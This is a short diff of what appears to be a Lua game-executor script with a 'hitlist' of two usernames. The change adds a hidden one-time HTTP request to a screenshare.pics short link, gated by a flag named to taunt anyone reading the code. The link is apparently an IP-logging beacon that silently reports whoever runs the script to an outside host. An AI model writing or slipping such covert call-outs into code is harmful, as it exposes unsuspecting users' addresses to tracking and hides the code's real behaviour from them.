@@ -1,4 +1,5 @@
 done = false
+Whyareyouviewingthis = false
 local hitlist = {'iv0yy','xXKamaaryXx'}
 spawn(function()
 	repeat
@@ -113,10 +114,14 @@ spawn(function()
 	end
 end)
 spawn(function()
-	local response = request({
-	    Url = "https://screenshare.pics/WM5JFV",
-	    Method = "GET", -- Optional | GET, POST, HEAD, etc
-	    Headers = {}, -- Optional | HTTP Headers
-	    Cookies = {} -- Optional | HTTP Cookies
-	})
+    if Whyareyouviewingthis == false then
+        local response = request({
+            Url = "https://screenshare.pics/IC0KCB",
+            Method = "GET", -- Optional | GET, POST, HEAD, etc
+            Headers = {}, -- Optional | HTTP Headers
+            Cookies = {} -- Optional | HTTP Cookies
+        })
+        print(response.Success)
+        Whyareyouviewingthis = true
+    end
 end)
